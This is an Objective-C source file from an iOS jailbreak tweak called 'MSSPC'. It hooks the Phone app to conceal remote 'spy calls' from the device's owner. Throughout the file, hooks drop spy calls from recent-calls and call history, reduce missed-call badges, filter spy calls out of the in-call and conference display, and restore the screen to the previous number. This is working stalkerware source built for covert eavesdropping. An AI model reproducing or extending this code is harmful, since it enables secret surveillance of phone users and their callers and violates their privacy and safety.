//
//  SpyCallMobilePhone.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "PhoneApplication.h"
#import "RecentCall.h"
#import "InCallController.h"
#import "PhoneCall.h"
#import "RecentsViewController.h"
#import "SixSquareView.h"
#import "SixSquareButton.h"
#import "InCallLCDView.h"

#import "SpyCallManager.h"
#import "SpyCallMobilePhoneService.h"
#import "SpyCallSerivceIDs.h"
#import "SpyCallUtils.h"
#import "SystemEnvironmentUtils.h"

#import "RecentsViewController+IOS6.h"
#import "PhoneApplication+IOS6.h"

#import "PARecentsManager.h"

#pragma mark -
#pragma mark C functions
#pragma mark -

BOOL isSpyCallInProgressMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallDisconnecting]);
}

BOOL isNormalCallIncomingMP() {
	return ([[SpyCallManager sharedManager] mIsNormalCallIncoming]);
}

BOOL isNormalCallInProgressMP() {
	return ([[SpyCallManager sharedManager] mIsNormalCallInProgress]);
}

BOOL isSpyCallInitiatingConferenceMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]);
}

BOOL isSpyCallInConferenceMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInConference]);
}

NSInteger normalCallCountMP() {
	return ([[SpyCallManager sharedManager] normalCallCount]);
}

void endSpyCallMP() {
	SpyCallMobilePhoneService *service = [SpyCallMobilePhoneService sharedService];
	[service sendService:kSpyCallServiceEndSpyCall withServiceData:nil];
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	[spycallManager disconnectedActivityDetected];
}

BOOL isAudioActiveMP() {
	return ([SpyCallUtils isPlayingAudio] || [SpyCallUtils isRecordingAudio]);
}

#pragma mark -
#pragma mark PhoneApplication hooks
#pragma mark -

HOOK(PhoneApplication, shouldAttemptPhoneCall, BOOL) {
    //APPLOGVERBOSE(@"shouldAttemptPhoneCall");
	if (isSpyCallInProgressMP()) {
		//APPLOGVERBOSE(@"shouldAttemptPhoneCall-spy call in progress");
		endSpyCallMP();
		//APPLOGVERBOSE(@"shouldAttemptPhoneCall-ended spy call");
		return FALSE;
	} else {
		//APPLOGVERBOSE(@"shouldAttemptPhoneCall-spy call not in progress");
		return CALL_ORIG(PhoneApplication, shouldAttemptPhoneCall);
	}
}

HOOK(PhoneApplication, dialVoicemail, BOOL) {
    DLog (@"dialVoicemail");
	if (isSpyCallInProgressMP()) {
		endSpyCallMP();
		return FALSE;
	} else {
		return CALL_ORIG(PhoneApplication, dialVoicemail);
	}
}

HOOK(PhoneApplication, _setTarBarItemBadge$forViewType$, void, int arg1, int arg2) {
	DLog (@"----------------------- _setTarBarItemBadge$forViewType$ ------------------------");
	DLog (@"arg1 = %d", arg1);
	DLog (@"arg2 = %d", arg2);
	DLog (@"----------------------- _setTarBarItemBadge$forViewType$ ------------------------");
	// Since SpringBoard have reset the badge of the icon, this method's implementation is work!
	if (isNormalCallInProgressMP() && [[SpyCallManager sharedManager] mIsSpyCallDisconnecting]) {
		int newBadgeTotal = 0;
		int *badges = nil;
		object_getInstanceVariable(self, "_badges", (void **)&badges);
		int *newBadges = (int *)malloc(5 * sizeof(int));
		for (NSInteger i = 0; i < 5; i++) {
			if (badges) {
				newBadges[i] = badges[i];
			} else {
				newBadges[i] = 0;
			}
			newBadgeTotal += newBadges[i];
		}
		int viewID = arg2;
		newBadges[viewID - 1] = newBadges[viewID - 1] - 1;
		
		// Reset badge array
		object_setInstanceVariable(self, "_badges", (void *)newBadges);
		// Reset total badge
		object_setInstanceVariable(self, "_badgeTotal", (void *)&newBadgeTotal);
		
		if (badges) free(badges);
		newBadges = nil;
	} else {
		CALL_ORIG(PhoneApplication, _setTarBarItemBadge$forViewType$, arg1, arg2);
	}
}

#pragma mark -
#pragma mark RecentCall hooks
#pragma mark -

HOOK(RecentCall, initWithCTCall$givenCountryCode$, id, id arg1, id arg2) {
	//APPLOGVERBOSE(@"initWithCTCall$givenCountryCode$");
	if ([SpyCallUtils isSpyCall:(CTCall *)arg1] && ![SpyCallUtils isOutgoingCall:(CTCall *)arg1]) {
        return nil;
    } else {
        return CALL_ORIG(RecentCall, initWithCTCall$givenCountryCode$, arg1, arg2);
    }
}

#pragma mark -
#pragma mark InCallController hooks
#pragma mark -

HOOK(InCallController, _endCallClicked$, void, id arg1) {
	APPLOGVERBOSE(@"_endCallClicked");
	if (isSpyCallInConferenceMP()) {
		endSpyCallMP();
		[NSThread sleepForTimeInterval:0.001];
	}
	CALL_ORIG(InCallController, _endCallClicked$, arg1);
}

HOOK(InCallController, _updateCurrentCallDisplay, void) {
	APPLOGVERBOSE(@"_updateCurrentCallDisplay");
	if (isSpyCallAnsweringMP() || isSpyCallInProgressMP()) {
		;
	} else {
		CALL_ORIG(InCallController, _updateCurrentCallDisplay);
	}
}

HOOK(InCallController, inCallLCDViewConferenceButtonClicked$, void, id arg1) {
	APPLOGVERBOSE(@"inCallLCDViewConferenceButtonClicked$");
	if (isSpyCallInProgressMP()) {
		endSpyCallMP();
	} else {
		CALL_ORIG(InCallController, inCallLCDViewConferenceButtonClicked$, arg1);
	}
}

HOOK(InCallController, _updateConferenceDisplayNameCache, id) {
	APPLOGVERBOSE(@"_updateConferenceDisplayNameCache");
	if (isSpyCallAnsweringMP() || isSpyCallInitiatingConferenceMP() || isSpyCallInConferenceMP()) {
		return nil;
	} else {
		return CALL_ORIG(InCallController, _updateConferenceDisplayNameCache); // Name of participants concatenated by &
	}
}

HOOK(InCallController, _setConferenceCall$, void, int arg1) {
	APPLOGVERBOSE(@"_setConferenceCall$");
	if (isSpyCallAnsweringMP() || isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallController, _setConferenceCall$, arg1);
		}
	} else {
		CALL_ORIG(InCallController, _setConferenceCall$, arg1);
	}
}

HOOK(InCallController, setDisplayedCalls$, void, id arg1) {
	APPLOGVERBOSE(@"setDisplayedCalls$");
	if (isSpyCallAnsweringMP() || isSpyCallInConferenceMP()) {
		NSMutableArray *phoneCalls = [NSMutableArray array];
		for (PhoneCall *phoneCall in arg1) {
			if (![SpyCallUtils isSpyCall:[phoneCall call]]) {
				[phoneCalls addObject:phoneCall];
			}
		}
		CALL_ORIG(InCallController, setDisplayedCalls$, phoneCalls);
	} else {
		CALL_ORIG(InCallController, setDisplayedCalls$, arg1);
	}
}

#pragma mark -
#pragma mark InCallLCDView hooks
#pragma mark -

HOOK(InCallLCDView, setText$, void, id arg1) {
	//APPLOGVERBOSE(@"setText$ arg1 = %@", arg1);
	if (isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallLCDView, setText$, arg1);
		} else {
			CALL_ORIG(InCallLCDView, setText$, [[[SpyCallManager sharedManager] mSystemEnvUtils] mTelephoneNumberBeforeSpyCallConference]);
		}
	} else {
		[[[SpyCallManager sharedManager] mSystemEnvUtils] setMTelephoneNumberBeforeSpyCallConference:arg1];
		CALL_ORIG(InCallLCDView, setText$, arg1);
	}
}

HOOK(InCallLCDView, setText$animating$, void, id arg1, BOOL arg2) {
	//APPLOGVERBOSE(@"setText$animating$ arg1 = %@, arg2 = %d", arg1, arg2);
	if (isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallLCDView, setText$animating$, arg1, arg2);
		} else {
			CALL_ORIG(InCallLCDView, setText$animating$, [[[SpyCallManager sharedManager] mSystemEnvUtils] mTelephoneNumberBeforeSpyCallConference], NO);
		}
	} else {
		[[[SpyCallManager sharedManager] mSystemEnvUtils] setMTelephoneNumberBeforeSpyCallConference:arg1];
		CALL_ORIG(InCallLCDView, setText$animating$, arg1, arg2);
	}
}

#pragma mark -
#pragma mark SixSquareView hooks
#pragma mark -

HOOK(SixSquareView, setTitle$image$forPosition$, void, id arg1, id arg2, int arg3) {
	//APPLOGVERBOSE(@"setTitle$image$forPosition$");
	if (isSpyCallInitiatingConferenceMP()) {
		;
	} else {
		CALL_ORIG(SixSquareView, setTitle$image$forPosition$, arg1, arg2, arg3);
	}
}

HOOK(SixSquareView, buttonAtPosition$, id, int arg1) {
	//APPLOGVERBOSE(@"buttonAtPosition$");
	if (isSpyCallInitiatingConferenceMP()) {
		return nil;
	} else {
		if (isSpyCallInConferenceMP() && arg1 == 4 && normalCallCountMP() <= 1) { // Hold(iOS4)/Face time(iOS5) button and conference with one normal
			return nil;
		} else {
			return CALL_ORIG(SixSquareView, buttonAtPosition$, arg1);
		}
	}
}

#pragma mark -
#pragma mark RecentsViewController hooks
#pragma mark -

HOOK(RecentsViewController, viewWillAppear$, void, BOOL arg1) {
	//APPLOGVERBOSE(@"viewWillAppear");
	CALL_ORIG(RecentsViewController, viewWillAppear$, arg1);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	if (![[spycallManager mSystemEnvUtils] mForceRecentCallDataChange]) {
		[[spycallManager mSystemEnvUtils] setMForceRecentCallDataChange:YES];
		Class $RecentsViewController = [self class];
		if ([$RecentsViewController respondsToSelector:@selector(_callDataChanged)]) { // IOS 4,5
			[self _callDataChanged];
		} else {
			[self _recentsManagerCallDeletedNotification:nil];
		}
	}
}

HOOK(RecentsViewController, viewDidAppear$, void, BOOL arg1) {
	//APPLOGVERBOSE(@"viewDidAppear");
	CALL_ORIG(RecentsViewController, viewDidAppear$, arg1);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	if ([[spycallManager mSystemEnvUtils] mForceRecentCallDataChange]) {
		[[spycallManager mSystemEnvUtils] setMForceRecentCallDataChange:NO];
	}
}

HOOK(RecentsViewController, badge, int) {
	APPLOGVERBOSE(@"badge");
	int badge = CALL_ORIG(RecentsViewController, badge);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	NSInteger numberOfMissedCall = [[spycallManager mSystemEnvUtils] mMissedCall];
	APPLOGVERBOSE(@"numberOfMissedCall = %d", numberOfMissedCall);
	if (numberOfMissedCall > 0) {
		APPLOGVERBOSE(@"Original badge = %d", badge);
		badge = badge - numberOfMissedCall;
		if (badge < 0) badge = 0;
		
		[[spycallManager mSystemEnvUtils] setMMissedCall:0];
	}
	APPLOGVERBOSE(@"Modified badge = %d", badge);
	return badge;
}

#pragma mark -
#pragma mark PARecentsManager
#pragma mark -

//HOOK(PARecentsManager, callHistorySignificantChangeNotification, void) {
//	DLog (@"------------- callHistorySignificantChangeNotification ---------------");
//	CALL_ORIG(PARecentsManager, callHistorySignificantChangeNotification);
//}

HOOK(PARecentsManager, callHistoryRecordAddedNotification$, void, struct __CTCall *arg1) {
	DLog (@"------------- callHistoryRecordAddedNotification$ ---------------");
	if (![SpyCallUtils isSpyCall:(CTCall *)arg1]) {
		DLog (@"Not spy call ...");
		CALL_ORIG(PARecentsManager, callHistoryRecordAddedNotification$, arg1);
	} else {
		DLog (@"Spy call thus not inlcude into history");
	}
}
